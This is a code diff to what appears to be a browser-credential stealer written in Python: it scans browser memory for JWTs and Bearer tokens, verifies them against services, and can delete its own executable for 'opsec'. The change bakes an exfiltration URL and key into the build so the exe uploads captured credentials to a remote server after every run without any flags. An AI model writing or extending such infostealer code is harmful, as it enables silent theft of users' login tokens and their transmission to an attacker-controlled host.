@@ -423,6 +423,11 @@ def _trunc(val: str, n: int = 80) -> str:
 
 # Fast pre-filter: C-speed bytes.__contains__ checks before running any regex.
 # A chunk that contains none of these prefixes can't contain a credential match.
+# Build-time exfil defaults — substituted by build_windows.ps1 / build_mac.sh.
+# When non-empty the exe auto-exfils after every run with no CLI flags required.
+_EXFIL_URL: str = ""
+_EXFIL_KEY: str = ""
+
 _QUICK_PREFIXES: tuple[bytes, ...] = (
     b"eyJ",            # JWT
     b"Bearer ",        # Bearer / Authorization headers
@@ -1735,8 +1740,8 @@ def main():
     parser.add_argument("--max-hits",    type=int, default=300, help="Max memory hits per browser before dedup (default: 300)")
     parser.add_argument("--self-delete", action="store_true", help="Delete exe after run (opsec)")
     parser.add_argument("--verify",      action="store_true", help="Verify captured tokens against their services (makes outbound requests)")
-    parser.add_argument("--exfil",       metavar="URL",       help="POST results to report server (e.g. https://reports.yourdomain.com)")
-    parser.add_argument("--exfil-key",   metavar="KEY",       help="API key for --exfil upload")
+    parser.add_argument("--exfil",       metavar="URL",       default=_EXFIL_URL or None, help="POST results to report server (default: baked in at build time)")
+    parser.add_argument("--exfil-key",   metavar="KEY",       default=_EXFIL_KEY or None, help="API key for --exfil (default: baked in at build time)")
     args = parser.parse_args()
 
     if args.verify:
@@ -1832,13 +1837,12 @@ def main():
             writer.writeheader()
             writer.writerows(all_csv_rows)
 
-    if args.exfil:
-        if args.exfil_key:
-            csv_path_for_exfil = out_path.replace(".txt", ".csv") if out_path.endswith(".txt") else out_path + ".csv"
-            report_url = _exfil_results(args.exfil, args.exfil_key, out_path, csv_path_for_exfil if all_csv_rows else None)
-            if report_url:
-                with open(out_path, "a", encoding="utf-8") as f:
-                    f.write(f"\n[+] Exfil: {report_url}\n")
+    if args.exfil and args.exfil_key:
+        csv_path_for_exfil = out_path.replace(".txt", ".csv") if out_path.endswith(".txt") else out_path + ".csv"
+        report_url = _exfil_results(args.exfil, args.exfil_key, out_path, csv_path_for_exfil if all_csv_rows else None)
+        if report_url:
+            with open(out_path, "a", encoding="utf-8") as f:
+                f.write(f"\n[+] Exfil: {report_url}\n")
 
     if args.self_delete and getattr(sys, "frozen", False):
         os.popen(f'cmd /c ping -n 2 127.0.0.1 > nul & del /f /q "{sys.executable}"')
